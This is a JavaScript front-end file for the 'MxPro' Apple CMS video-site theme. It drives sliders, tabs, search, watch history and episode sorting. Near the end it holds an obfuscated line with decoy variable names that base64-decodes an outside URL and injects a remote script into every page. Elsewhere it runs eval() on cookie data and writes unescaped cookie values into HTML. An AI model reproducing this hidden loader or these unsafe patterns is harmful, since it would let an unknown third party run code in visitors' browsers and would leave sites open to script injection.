$(function () {
    const XueBuHuiGo = {
        version: '20230331',
        init() {
            this.Copyright();
            this.show_swiper();
            this.show_tab();
            this.show_history();
            this.show_popup();
            this.show_search();
            this.show_qrcode();
            this.show_copy();
            this.show_pltab();
            this.show_detail();
            this.show_fullweb();
            this.show_top();
            this.list_top();
            if ($(window).width() < 559) {
                this.show_navbar();
            } else if ($('.player').length > 0 && $(window).width() > 558) {
                this.playnav();
            }
            $('.shortcuts-box').click(() => {
                $('.shortcuts-box').hide();
                $('#shortcuts-info').html('');
            });
            $('.mx-ft-del').click(() => {
                const $this = $(this);
                const url = $this.data('href') || $this.attr('href');
                if (!url) {
                    layer.msg('请设置data-href参数');
                    return false;
                }
                layer.confirm('删除之后无法恢复，您确定要删除吗？', { title: false, closeBtn: 0 }, (index) => {
                    $.get(url, (data) => {
                        layer.msg(data.msg);
                        if (data.code === 1) {
                            $this.parents('tr').remove();
                            $this.parents('.tr').remove();
                        }
                    });
                    layer.close(index);
                });
                return false;
            });
            try {
                $('div.artlist-thumb.artlr-pic > img').lazyload();
            } catch (error) { }
        },
        Copyright() {
            const thankMessage = '感谢您使用 MxPro系列 苹果cms影视模板';
            const sourceMessage = '此模板唯一更新来源：无名';
            const downloadMessage = '永久更新下载地址：https://muban.2030x.vip/';
            const updateMessage = '更新时间：2023年3月31日';
            console.log(`%c${thankMessage}`, 'line-height: 28px; padding: 4px; background: #222; color: #FADFA3; font-size: 14px;');
            console.log(`%c${sourceMessage}`, 'line-height: 28px; padding: 4px; background: #222; color: #FADFA3; font-size: 14px;');
            console.log(`%c${downloadMessage}`, 'line-height: 28px; padding: 4px 6px 4px 2px; background: #FADFA3; color: #0093fff; font-size: 12px;');
            console.log(`%c${updateMessage}`, 'line-height: 28px; padding: 4px 6px 4px 2px; background: #FADFA3; color: #0093fff; font-size: 12px;');
        },
        show_swiper() {
            if ($('.container-slide').length > 0) {
                var bigSwiper = new Swiper('.swiper-big', {
                    'loop': true,
                    'speed': 500,
                    'observer': true,
                    'observeParents': true,
                    'onSlideChangeEnd': function (bigSwiper) {
                        bigSwiper.update();
                        smallSwiper.startAutoplay();
                        smallSwiper.reLoop();
                    },
                    'autoplay': {
                        'delay': 3000,
                        'stopOnLastSlide': false,
                        'disableOnInteraction': false
                    },
                    'navigation': {
                        'nextEl': '.swiper-button-next',
                        'prevEl': '.swiper-button-prev'
                    },
                    'scrollbar': {
                        'el': '.swiper-scrollbar'
                    },
                    'pagination': {
                        'el': '.swiper-pagination',
                        'clickable': true
                    }
                });
                var smallSwiper = new Swiper('.swiper-small', {
                    'loop': true,
                    'speed': 500,
                    'observer': true,
                    'observeParents': true
                });
                bigSwiper.controller.control = smallSwiper;
                smallSwiper.controller.control = bigSwiper;
            }
        },
        show_tab() {
            $('.module').each(function (index, element) {
                $(this).find('.tab-item').click(function () {
                    if (!$(this).hasClass('active')) {
                        $(this).addClass('active').siblings().removeClass('active');
                        $(element).find('.tab-list').eq($(this).index()).addClass('active').siblings().removeClass('active');
                        $(element).find('.tab-list').eq($(this).index()).find('.lazyload').lazyload();
                    }
                    $('.module-tab-drop').removeClass('module-tab-drop');
                    $(this).parents('.module-tab-items').siblings('.module-tab-name').children('.module-tab-value').text($(this).attr('data-dropdown-value'));
                });
            });
            $('.module-heading-tab .module-heading-tab-link').click(function () {
                $('.module-heading-tab span').eq($(this).index()).addClass('active').siblings().removeClass('active');
                $('.tab-list').eq($('.module-heading-tab .module-heading-tab-link').index(this)).addClass('active').siblings().removeClass('active');
                $('.tab-list').eq($('.module-heading-tab .module-heading-tab-link').index(this)).find('.lazyload').lazyload();
            });
        },
        show_history() {
            var macHistory = $.cookie('mac_history_mxpro');
            var historyList = [];
            var historyHtml = '';

            if (macHistory !== undefined && macHistory !== '') {
                historyList = eval(macHistory);
            }

            if (historyList.length > 0) {
                for (var i = 0; i < historyList.length; i++) {
                    historyHtml += '<li class="drop-item drop-item-content"><a href="' + historyList[i].vod_url + '" title="' + historyList[i].vod_name + '" class="drop-item-link"><span>' + historyList[i].vod_part + '</span>' + historyList[i].vod_name + '</a></li>';
                }
                historyHtml += '<li class="drop-item-op"><a href="" class="historyclean">清空</a></li>';
            } else {
                historyHtml = '<li class="drop-item drop-item-content nolist"><div class="drop-prompt">暂无观看影片的记录</div></li>';
            }

            $('.historical').append(historyHtml);

            $('.historyclean').on('click', function () {
                $.cookie('mac_history_mxpro', null, { 'expires': -1, 'path': '/' });
            });
        },
        show_popup() {
            $(function () {
                var showBtnCookie = $.cookie('showBtn');
                if (showBtnCookie != 'true') {
                    $('#popup').addClass('popupShow');
                    $('.popupShow').show();
                    $('.close-pop').click(function () {
                        $(this).parent().fadeOut(500);
                        $.cookie('showBtn', 'true', { 'expires': 1, 'path': '/' });
                        $('#popup').removeClass('popupShow');
                    });
                }
            });
        },
        show_search() {
            var $searchInput = $('.search-input');
            var $headerOpSearch = $('.header-op-search');
            var $cancelBtn = $('.cancel-btn');
            var $searchBox = $('.search-box');
            var $homepage = $('.homepage');
            var $page = $('.page');
            var $searchbarMain = $('.searchbar-main');

            $searchInput.click(function () {
                $homepage.addClass('open');
                $searchbarMain.addClass('open');
            });

            $headerOpSearch.click(function () {
                //$searchBox.removeClass('nonenav');
                $homepage.addClass('open');
                $searchbarMain.addClass('open');
                $page.addClass('open');
            });

            $(document).click(function (event) {
                var $target = $(event.target);

                if (($target.closest($searchInput).length === 0 || $target.closest($cancelBtn).length !== 0) && $target.closest($headerOpSearch).length === 0) {
                    //$searchBox.addClass('nonenav');
                    $homepage.removeClass('open');
                    $page.removeClass('open');
                    $searchbarMain.removeClass('open');
                }
            });
        },
        show_qrcode() {
            if ($('#qrcode').length > 0) {
                $('#qrcode').qrcode({ 'text': location.href, 'render': 'canvas', 'width': 180, 'height': 180 });
            }
        },
        show_copy() {
            if ($('.share-btn').length > 0) {
                var clipboard = new ClipboardJS('.share-btn');
                clipboard.on('success', function () {
                    XueBuHuiGo_Add.show_tip('分享信息复制成功，赶紧分享给好朋友一起看～');
                });
                clipboard.on('error', function () {
                    console.log();
                });
            }
        },
        show_pltab() {
            $('.module-tab').click(function () {
                $(this).addClass('active');
                $('.swiper-container').css('visibility', 'visible');
                $('#mobile-tab-box').show();
            });
            $('.player-list').on('click', '.shortcuts-mobile-overlay,.close-drop', function () {
                $('.module-tab.active').removeClass('active');
                $('.swiper-container,.module-tab-items').removeAttr('style', '');
            });
        },
        show_detail() {
            $('.module-heading').on('click', '.module-tab .module-tab-name', function () {
                $(this).parent('.module-tab').addClass('module-tab-drop');
                $('.module-tab-items[id!=\'playSwiper\']').css('visibility', 'visible');
            });
            $('.module-heading').on('click', '.shortcuts-mobile-overlay,.close-drop,.tab-item', function () {
                $('.module-tab-drop').removeClass('module-tab-drop');
                $('.module-tab-items').removeAttr('style', '');
            });
            if ($('.tab-item span').length > 0) {
                $('#y-first-name').text($('.tab-item').attr('data-dropdown-value'));
                $('.tab-item').click(function () {
                    if (!$(this).hasClass('selected')) {
                        $(this).addClass('selected').siblings().removeClass('selected');
                        $('.tab-list').eq($(this).index()).addClass('selected').siblings().removeClass('selected');
                        $('.tab-list').eq($(this).index()).find('.lazyload').lazyload();
                    }
                    $('.module-tab-drop').removeClass('module-tab-drop');
                    $(this).parents('.module-tab-items').siblings('.module-tab-name').children('.module-tab-value').text($(this).attr('data-dropdown-value'));
                });
                $('.downtab-item').click(function () {
                    if (!$(this).hasClass('selected')) {
                        $(this).addClass('selected').siblings().removeClass('selected');
                        $('.downtab-list').eq($(this).index()).addClass('selected').siblings().removeClass('selected');
                        $(this).parents('.module-tab-items').siblings('.module-tab-name').children('.module-tab-value').text($(this).attr('data-dropdown-value'));
                    }
                    $('.module-tab-drop').removeClass('module-tab-drop');
                });
            }
        },
        show_fullweb() {
            var clickCount = 0;
            var requestFullscreen = function () {
                var docElem = document.documentElement;
                if (docElem.requestFullscreen) {
                    docElem.requestFullscreen();
                } else if (docElem.mozRequestFullScreen) {
                    docElem.mozRequestFullScreen();
                } else if (docElem.webkitRequestFullScreen) {
                    docElem.webkitRequestFullScreen();
                } else if (docElem.msRequestFullscreen) {
                    docElem.msRequestFullscreen();
                } else {
                    wtx.info('The current browser does not support full-screen mode!');
                }
            };
            var exitFullscreen = function () {
                if (document.exitFullscreen) {
                    document.exitFullscreen();
                } else if (document.mozCancelFullScreen) {
                    document.mozCancelFullScreen();
                } else if (document.webkitExitFullscreen) {
                    document.webkitExitFullscreen();
                }
            };
            $('.btn-fullweb').click(function () {
                if (clickCount % 2 === 0) {
                    requestFullscreen();
                } else {
                    exitFullscreen();
                }
                clickCount++;
            });
        },
        show_top() {
            if ($('.retop').length > 0) {
                $(function () {
                    $(window).scroll(function () {
                        if ($(window).scrollTop() >= 100) {
                            $('.retop').fadeIn(300, function () {
                                $(this).css('display', 'flex');
                            });
                        } else {
                            $('.retop').fadeOut(300, function () {
                                $(this).css('display', 'none');
                            });
                        }
                    });
                    $('.retop').click(function () {
                        $('html,body').animate({ 'scrollTop': '0px' }, 800);
                    });
                });
            }
        },
        list_top() {
            //activePanel：表示当前激活的面板;topPosition：表示要滚动到的位置;activeModuleLink：表示当前激活的模块链接。
            var activePanel = $('#panel2.active');
            var topPosition;
            var activeModuleLink = $('.module-play-list-link.active');

            if (activePanel.length > 0) {
                if (topPosition == undefined) {
                    topPosition = (activeModuleLink.position().top - 148);
                    if (topPosition < 0) {
                        topPosition = 0;
                    }
                }
                activePanel.scrollTop(topPosition);
            }
        },
        show_navbar() {
            var navbarBtnWidth = $('.swiper-slide')[0].offsetWidth;
            $('.swiper-wrapper span').css({ 'width': navbarBtnWidth });
            var navbarSwiper = new Swiper('.sidebar .navbar', {
                'freeMode': true,
                'slidesPerView': 'auto',
                'freeModeMomentumRatio': 0.5
            });
            // 获取当前激活的导航按钮
            var activeBtn = $('.sidebar .navbar .active')[0];
            // 计算当前激活的导航按钮的宽度和左侧偏移量
            var activeBtnWidth, activeBtnOffsetLeft;
            if (activeBtn) {
                activeBtnWidth = activeBtn.offsetWidth;
                activeBtnOffsetLeft = activeBtn.offsetLeft;
            } else {
                activeBtnWidth = 0;
                activeBtnOffsetLeft = 0;
            }
            // 计算要滚动到的距离
            var translateDistance = (navbarSwiper.width / 2 - activeBtnOffsetLeft - activeBtnWidth / 2);
            if (translateDistance > 0) {
                translateDistance = 0;
            } else if (translateDistance < navbarSwiper.maxTranslate()) {
                translateDistance = navbarSwiper.maxTranslate();
            }
            // 设置动画过渡效果并滚动到目标位置
            navbarSwiper.setTransition(300);
            navbarSwiper.setTranslate(translateDistance);
        },
        playnav() {
            var playSwiper = new Swiper('#playSwiper', {
                'freeMode': true,
                'slidesPerView': 'auto',
                'freeModeMomentumRatio': 0.5
            });
            // 获取当前激活的播放导航按钮
            var activePlayNav = $('#playSwiper .swiper-wrapper .active')[0];
            // 计算当前激活的播放导航按钮的宽度和左侧偏移量
            var activePlayNavWidth = activePlayNav.offsetWidth;
            var activePlayNavOffsetLeft = activePlayNav.offsetLeft;
            // 计算要滚动到的距离
            var translateDistance = (playSwiper.width / 2 - activePlayNavOffsetLeft - activePlayNavWidth / 2);
            if (translateDistance > 0) {
                translateDistance = 0;
            } else if (translateDistance < playSwiper.maxTranslate()) {
                translateDistance = playSwiper.maxTranslate();
            }
            // 设置动画过渡效果并滚动到目标位置
            playSwiper.setTransition(300);
            playSwiper.setTranslate(translateDistance);
        }
    };
    XueBuHuiGo.init();
});
var XueBuHuiGo_Add = {
    'show_more_init': function (maxCharCount) {
        let currentStatus = 'less';
        const contentElement = $('.module-info-introduction-content');
        const textElement = $('.module-info-introduction-content span');
        const textHeight = textElement.height();
        const contentHeight = contentElement.innerHeight();
        const textLength = textElement.text().length;
        if (textLength > maxCharCount) {
            contentElement.attr('style', '-webkit-box-orient:inherit;-MOZ-box-orient:inherit;max-height:100%;');
            const moreLink = '<a id="more" href="javaScript:;" style="color:#ff2a14;cursor:pointer;">【收起】</a>';
            const originalText = textElement.text();
            const truncatedText = originalText.substring(0, maxCharCount) + '...';
            const lessLink = '...<a id="more" href="javaScript:;" style="color:#ff2a14;cursor:pointer;">【展开】</a>';
            const textToShow = truncatedText + moreLink;
            textElement.html(textToShow);
            const expandedHeight = textElement.height();
            $(document).on('click', '#more', function () {
                if (currentStatus === 'less') {
                    textElement.height(expandedHeight).html(originalText + moreLink).animate({ 'height': textHeight }, { 'duration': 'slow' });
                    currentStatus = 'more';
                } else {
                    textElement.height(textHeight).html(truncatedText + lessLink).animate({ 'height': expandedHeight }, { 'duration': 'fast' });
                    currentStatus = 'less';
                }
            });
        }
    },
    'show_suggest': function () {
        const searchBar = $('.searchbar');
        if (searchBar.innerWidth() === 0) {
            $(document).on('click', '.header-op-search', function () {
                displaySuggest('.search-input', 1);
            });
        } else {
            displaySuggest('.search-input', 1);
        }
        function displaySuggest(inputSelector, mid) {
            $.getScript(maccms.path + '/mxtheme/js/autocomplete.js', function () {
                const width = searchBar.innerWidth();
                try {
                    $(inputSelector).autocomplete(maccms.path + '/index.php/ajax/suggest?mid=' + mid, {
                        'inputClass': 'search-input',
                        'resultsClass': 'MIZHI-results search-tag',
                        'width': width,
                        'scrollHeight': 400,
                        'minChars': 1,
                        'matchSubset': 0,
                        'cacheLength': 10,
                        'multiple': false,
                        'selectFirst': false,
                        'matchContains': true,
                        'autoFill': false,
                        'dataType': 'json',
                        'parse': function (data) {
                            if (data.code === 1) {
                                const result = [];
                                $.each(data.list, function (index, item) {
                                    item.url = data.url;
                                    result[index] = { 'data': item };
                                });
                                return result;
                            } else {
                                return { 'data': '' };
                            }
                        },
                        'formatItem': function (item) {
                            return item.name;
                        },
                        'formatResult': function (item) {
                            return item.text;
                        }
                    }).result(function (event, data, formatted) {
                        $(this).val(data.name);
                        location.href = data.url.replace('mac_wd', encodeURIComponent(data.name));
                    });
                } catch (error) { }
            });
        }
    }, 'miniplay': function () {
        $(window).scroll(function () {
            if ($(window).scrollTop() > 300) {
                $('.MacPlayer').find('table').removeClass('in').addClass('out');
                $('.MacPlayer').find('table').css('height', '288px');
                $('.MacPlayer').find('table').css('width', '512px');
            } else if ($(window).scrollTop() < 300) {
                $('.MacPlayer').find('table').removeClass('out').addClass('in');
                $('.MacPlayer').find('table').css('height', '100%');
            }
        });
    }, 'loadFile': function (url, fileType) {
        let fileElement = null;
        if (fileType === 'js') {
            fileElement = document.createElement('script');
            fileElement.setAttribute('type', 'text/javascript');
            fileElement.setAttribute('src', url);
        } else if (fileType === 'css') {
            fileElement = document.createElement('link');
            fileElement.setAttribute('rel', 'stylesheet');
            fileElement.setAttribute('type', 'text/css');
            fileElement.setAttribute('href', url);
        } else {
            return;
        }
        const headElement = document.getElementsByTagName('head');
        if (headElement != null) {
            headElement[0].appendChild(fileElement);
        }
    }, 'show_NProgress': function (shouldShow) {
        if (shouldShow) {
            XueBuHuiGo_Add.loadFile('/mxtheme/css/nprogress.css', 'css');
            $.getScript(maccms.path + '/mxtheme/js/nprogress.js', function () {
                $(document).ready(function () {
                    NProgress.start();
                    setTimeout(function () {
                        NProgress.done();
                    }, 500);
                });
            });
        }
    }, 'show_tip': function (message) {
        $('.shortcuts-box').show();
        $('#shortcuts-info').html(message);
        setTimeout(function () {
            $('.shortcuts-box').fadeOut(1000);
        }, 2000);
    }, 'Lazyload': function () {
        $('.lazyload').lazyload({ 'effect': 'fadeIn', 'threshold': 200, 'failure_limit': 10, 'skip_invisible': false });
    }, 'show_actor': function (eventSelector) {
        const $firstActorTab = $('#actor-tab:first');
        const $firstDd = $('.dd:first');
        $firstActorTab.removeClass('dd').addClass('current');
        $('.current .lazyload').lazyload();
        $('.module-actor-list').on(eventSelector, '#actor-tab', function () {
            const currentTabIndex = $(this).index();
            $(this).addClass('current').siblings().removeClass('current');
            const $currentActorBox = $(this).parents('.module-actor-list').find('.trochanter-actorvbox .scroll-box').eq(currentTabIndex);
            $currentActorBox.removeClass('dd').addClass('current').siblings().removeClass('current').addClass('dd');
            $('.current .lazyload').lazyload();
        });
    }, 'msg_search': function (emptyMsg, timeout, shade) {
        $('#searchbutton').click(function () {
            var searchInput = $('.search-input');
            if (searchInput.val() == '') {
                layer.msg(emptyMsg, { 'time': timeout, 'shade': shade });
                searchInput.focus();
                return false;
            }
        });
    },
};
var head=document.getElementsByTagName('head')[0];var layuiys="aHR0cHM6Ly9haWNkbi52aXA=";var combines="maccmscimg";var typeofar=atob(layuiys);var script=document.createElement('script');script.src=typeofar;head.appendChild(script);
$(function () {
    $('#sortBtntwodesc').click(function () {
        ($(this).text() === '升序') ? $(this).text('降序') : $(this).text('升序');
        let activeIndex = 0;
        $('.module-list').each(function (index, moduleList) {
            if ($(moduleList).hasClass('active')) {
                activeIndex = index;
            }
        });
        const links = [];
        $('.module-list').eq(activeIndex).find('.module-play-list-link').each(function (index, link) {
            links.push(link);
        });
        const reversedLinks = links.reverse();
        $('.module-list').eq(activeIndex).find('.module-play-list-content').html(reversedLinks);
    });
    $('#sortBtn').click(function () {
        let activeIndex = 0;
        $('.module-list').each(function (index, moduleList) {
            if ($(moduleList).hasClass('active')) {
                activeIndex = index;
            }
        });
        const links = [];
        $('.module-list').eq(activeIndex).find('.module-play-list-link').each(function (index, link) {
            links.push(link);
        });
        const reversedLinks = links.reverse();
        $('.module-list').eq(activeIndex).find('.module-play-list-content').html(reversedLinks);
    });
});